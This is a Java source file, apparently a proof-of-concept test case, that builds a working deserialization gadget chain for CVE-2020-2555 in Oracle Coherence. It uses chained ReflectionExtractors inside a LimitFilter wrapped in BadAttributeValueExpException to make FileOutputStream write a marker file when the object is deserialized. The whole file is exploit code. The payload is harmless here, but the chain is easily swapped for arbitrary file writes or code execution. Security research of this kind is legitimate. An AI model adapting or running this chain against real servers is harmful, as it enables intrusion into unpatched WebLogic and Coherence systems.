package com.feihong.testcase;

import com.feihong.utils.Util;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.lang.reflect.Field;

public class TestFileOutputStreamWithCVE_2020_2555 {
    public static void main(String args[]) throws Exception {

        byte[] payload = "CVE_2020_2555 works!".getBytes();

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[]{new Class[]{String.class}}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[]{"CVE_2020_2555.txt"}}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "write",
                new Object[]{payload}
        );

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                extractor1,
                extractor2,
                extractor3
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, FileOutputStream.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        //序列化
        byte[] bytes = Util.serialize(badAttributeValueExpException);

        //反序列化
        Util.deserialize(bytes);
    }
}
